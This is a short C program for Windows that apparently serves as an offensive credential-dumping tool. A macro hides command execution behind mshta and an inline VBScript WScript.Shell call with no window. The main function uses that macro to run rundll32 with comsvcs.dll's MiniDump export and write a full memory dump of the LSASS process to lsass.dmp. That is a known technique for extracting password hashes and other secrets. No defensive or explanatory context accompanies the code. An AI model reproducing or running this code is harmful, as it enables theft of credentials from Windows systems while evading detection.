#include <windows.h>

#define RUN(to_run) \
    si.cb = sizeof(STARTUPINFOA); \
    if (CreateProcessA(NULL, (LPSTR)"mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run(\"\"" to_run "\"\",0)(window.close)\")",\
     NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { \
        WaitForSingleObject(pi.hProcess, INFINITE); \
        CloseHandle(pi.hProcess); \
        CloseHandle(pi.hThread); \
    }

STARTUPINFOA si;
PROCESS_INFORMATION pi;

int main() {
    RUN("rundll32.exe C:\\Windows\\System32\\comsvcs.dll Mini_Dump PID lsass.dmp full");

    return 0;
}
